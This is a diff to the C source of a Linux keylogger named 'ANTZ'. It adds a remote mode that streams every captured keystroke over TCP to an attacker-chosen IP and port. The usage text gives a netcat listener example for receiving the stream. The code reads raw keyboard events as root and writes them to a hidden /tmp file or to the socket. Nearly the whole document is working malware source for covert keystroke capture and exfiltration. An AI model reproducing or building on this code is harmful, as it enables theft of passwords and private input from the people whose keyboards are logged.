@@ -1,5 +1,6 @@
-/*ANTZ SIMPLE_LOCAL_KEYLOGGER*/
-/*A lot of functionalities must be added. Coming soon......*/
+/* ANTZ 
+ * SIMPLE_LOCAL_&_REMOTE_KEYLOGGER
+ * A lot of functionalities must be added. Coming soon......*/
 
 
 /* 
@@ -288,10 +289,14 @@ struct input_event {
 #include <stdio.h>
 #include <fcntl.h>
 #include <stdlib.h>
+#include <ctype.h>
 #include <string.h>
 #include <signal.h>
 #include <dirent.h>
 #include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
 
 char* code_to_str(int code)
 {
@@ -422,23 +427,18 @@ void handler()
 	exit(0);
 }
 
-//It must be run as root
-// sudo ./slk [-d device] [ -o /path/to/file.txt] [-h]
-
 void banner()
 {
-	
-fprintf(stderr,"\n_____/\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\______________/\\\\\\________/\\\\\\_\n");        
-fprintf(stderr," ___/\\\\\\/////////\\\\\\_\\/\\\\\\_____________\\/\\\\\\_____/\\\\\\//__\n");       
-fprintf(stderr,"  __\\//\\\\\\______\\///__\\/\\\\\\_____________\\/\\\\\\__/\\\\\\//_____\n");      
-fprintf(stderr,"   ___\\////\\\\\\_________\\/\\\\\\_____________\\/\\\\\\\\\\\\//\\\\\\_____\n");     
-fprintf(stderr,"    ______\\////\\\\\\______\\/\\\\\\_____________\\/\\\\\\//_\\//\\\\\\____\n");    
-fprintf(stderr,"     _________\\////\\\\\\___\\/\\\\\\_____________\\/\\\\\\____\\//\\\\\\___\n");   
-fprintf(stderr,"      __/\\\\\\______\\//\\\\\\__\\/\\\\\\_____________\\/\\\\\\_____\\//\\\\\\__\n");  
-fprintf(stderr,"       _\\///\\\\\\\\\\\\\\\\\\\\\\/___\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\______\\//\\\\\\_\n"); 
-fprintf(stderr,"        ___\\///////////_____\\///////////////__\\///________\\///__\n");
-fprintf(stderr,"\n~antz~\n");
-
+	fprintf(stderr,"\n_____/\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\________________/\\\\\\\\\\\\\\\\\\______/\\\\\\________/\\\\\\\n");         
+	fprintf(stderr," ___/\\\\\\/////////\\\\\\_\\/\\\\\\______________/\\\\\\///////\\\\\\___\\/\\\\\\_____/\\\\\\//\n");        
+	fprintf(stderr,"  __\\//\\\\\\______\\///__\\/\\\\\\_____________\\/\\\\\\_____\\/\\\\\\___\\/\\\\\\__/\\\\\\//\n");       
+	fprintf(stderr,"   ___\\////\\\\\\_________\\/\\\\\\_____________\\/\\\\\\\\\\\\\\\\\\\\\\/____\\/\\\\\\\\\\\\//\\\\\\\n");      
+	fprintf(stderr,"    ______\\////\\\\\\______\\/\\\\\\_____________\\/\\\\\\//////\\\\\\____\\/\\\\\\//_\\//\\\\\\\n");     
+	fprintf(stderr,"     _________\\////\\\\\\___\\/\\\\\\_____________\\/\\\\\\____\\//\\\\\\___\\/\\\\\\____\\//\\\\\\\n");    
+	fprintf(stderr,"      __/\\\\\\______\\//\\\\\\__\\/\\\\\\_____________\\/\\\\\\_____\\//\\\\\\__\\/\\\\\\_____\\//\\\\\\\n");   
+	fprintf(stderr,"       _\\///\\\\\\\\\\\\\\\\\\\\\\/___\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\______\\//\\\\\\_\\/\\\\\\______\\//\\\\\\\n");  
+	fprintf(stderr,"        ___\\///////////_____\\///////////////__\\///________\\///__\\///________\\///\n"); 
+	fprintf(stderr,"\n~antz~\n");
 }
 
 
@@ -448,10 +448,12 @@ int main(int argc, char** argv)
 {	
 	struct input_event event;
 	struct dirent *curr;
-	char name[LEN], filetxt[LEN]; 
-	int c, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
+	char name[LEN], filetxt[LEN], *port, *addr;
+	int lc, c, m=0, p= 0, a = 0, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
 	DIR *directory;
 	FILE *dst;	
+	struct addrinfo hints, *result, *rp;
+	
 	
 	if(getuid())
         {
@@ -463,12 +465,15 @@ int main(int argc, char** argv)
 	void usage()
 	{
 		banner();
-		fprintf(stderr,"\nUsage: #%s [-d device] [-o output.txt] [-h]\n", argv[0]);
-		fprintf(stderr,"\nIf -d is not specified, the default device is /dev/input/by-path/xxx-kbd.\nIf -o is not specified, the default output file is in /tmp/.logger.txt.\n");
+		fprintf(stderr,"\nUsage: #%s [OPTIONS]\n", argv[0]);
+		fprintf(stderr,"\nOPTIONS:\n\t-d: input device (if not specified, the default device is '/dev/input/by-path/***kbd')\n");
+		fprintf(stderr,"\t-o: output file. (It can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt')\n");
+		fprintf(stderr,"\t-m remote -a <IP-ADDR> -p <PORT>: it sends all the keystrokes on the remote server located at <IP-ADDR:PORT>\n");
+		fprintf(stderr,"\nEXAMPLE\nServer$ nc lvp 8888 > logger.txt\nClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
 		exit(0);
 	}
 	
-	while((c = getopt(argc, argv, ":d:o:")) != -1)
+	while((c = getopt(argc, argv, ":d:o:m:p:a:")) != -1)
 	{
 		switch(c)
 		{
@@ -477,31 +482,48 @@ int main(int argc, char** argv)
 					name[LEN-1] = '\0';
 					d = 1;
 					break;
-			case 'o': 	strncpy(filetxt, optarg, LEN); 
+					
+			case 'o': 	
+					strncpy(filetxt, optarg, LEN); 
 					filetxt[LEN-1] = '\0';
 					o = 1;
 					break;
+					
+			case 'm': 	
+					if(!strcmp(optarg,"remote"))
+					{
+						m = 1;
+						break;
+					}
+					fprintf(stderr, "Invalid argument \"-m %s\"\n", optarg);
+					  	exit(1);
+					
+			case 'p':	
+					if(strlen(optarg) > 5)
+					{
+						fprintf(stderr, "Insert a valid port!!\n");
+						exit(1);
+					}
+					port = optarg;
+					p = 1;
+					break;
+					
+			case 'a':	
+					addr = optarg;
+					a = 1;
+					break;
+					
 			default:
 					usage();
 		}
 	}
-
-	
 
 	if(signal(SIGINT, handler) == SIG_ERR)
 	{
 		fprintf(stderr, "Error to handle SIGINT\n");
 		exit(1);
 	}
-	if(!o)
-	{
-		snprintf(filetxt, 17, "/tmp/.logger.txt");
-	}
-	if( (dst = fopen(filetxt, "a")) == NULL)
-	{
-		fprintf(stderr,"Error to open file\n");
-		exit(1);
-	}
+	
 	
 	if(!d)
 	{
@@ -532,6 +554,66 @@ int main(int argc, char** argv)
 		exit(1);
 	}
 	
+
+	if(!m && !p && !a)
+	{
+		if(!o)
+		{
+			snprintf(filetxt, 17, "/tmp/.logger.txt");
+		}
+		if( (dst = fopen(filetxt, "a")) == NULL)
+		{
+			fprintf(stderr,"Error to open file\n");
+			exit(1);
+		}
+	}
+	else if(m && p && a)
+	{
+		if(o)
+		{
+				fprintf(stderr, "Too much arguments. You can't specify output file with \"-m remote\" option.\n");
+				exit(1);
+		}
+		memset(&hints,0,sizeof(struct addrinfo));
+			hints.ai_canonname = NULL;
+			hints.ai_addr = NULL;
+			hints.ai_next = NULL;
+			hints.ai_socktype = SOCK_STREAM;
+			hints.ai_family = AF_UNSPEC;
+			hints.ai_flags = AI_NUMERICSERV;
+			
+			if(getaddrinfo(addr, port, &hints, &result) ==-1)
+			{
+				fprintf(stderr,"Failed to get address info");
+			}
+			for(rp = result; rp != NULL; rp = rp->ai_next)
+			{
+				lc = socket(rp->ai_family,rp->ai_socktype,rp->ai_protocol);
+				if(lc == -1)
+				{
+					continue;
+				}
+				if(connect(lc, rp->ai_addr, rp->ai_addrlen) != -1)
+				{
+					break;
+				}
+
+				close(lc);
+			}
+			if(rp == NULL)
+			{
+				fprintf(stderr,"Failed to find a good address");
+			}
+
+			freeaddrinfo(result);
+					
+	}
+	else
+	{	
+		fprintf(stderr, "Invalid arguments.\n");
+		usage();
+	}
+	
 	while(1)
 	{
 
@@ -544,8 +626,15 @@ int main(int argc, char** argv)
 		
 		if(event.type == EV_KEY && !event.value)
 			
-			fprintf(dst,"%s",code_to_str(event.code));
-			fflush(NULL);
+			if(!m)
+			{
+				fprintf(dst,"%s",code_to_str(event.code));
+				fflush(NULL);
+			}
+			else
+			{	
+				write(lc, code_to_str(event.code), strlen(code_to_str(event.code)));	
+			}
 			
 	}
 	return 0;
